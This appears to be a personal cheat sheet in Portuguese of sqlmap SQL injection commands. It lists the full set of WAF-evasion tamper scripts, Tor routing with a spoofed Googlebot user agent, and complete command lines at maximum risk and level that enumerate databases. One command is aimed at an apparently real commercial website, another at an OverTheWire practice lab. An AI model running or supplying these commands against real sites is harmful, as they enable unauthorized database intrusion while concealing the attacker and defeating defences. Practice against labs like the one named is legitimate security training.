mysql_real_escape_string adiciona '\' a "\x00, \n, \r, \, ', " and \x1a
' -> \'

* Todos os tampers
--tamper="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords"

* Usar o TOR e user-agent googlebot:
--check-tor --tor --tor-type=SOCKS5 --user-agent="Googlebot (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

* Sem tor e random-agent:
sqlmap -u https://www.wbeer.com.br/w/sucessos/?posicao=1 -p posicao --dbs --risk 3 --tamper='between,space2comment,randomcase' --random-agent -v 3 --level 5 

* Yes pra todas perguntas
--answers='optimize=y'

* MySQL w/ tamper:
sqlmap -u https://redtiger.labs.overthewire.org/level1.php?cat=1 --dbs --risk 3 --tamper="between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor" --random-agent -v 3 --level 3 --answers='optimize=y'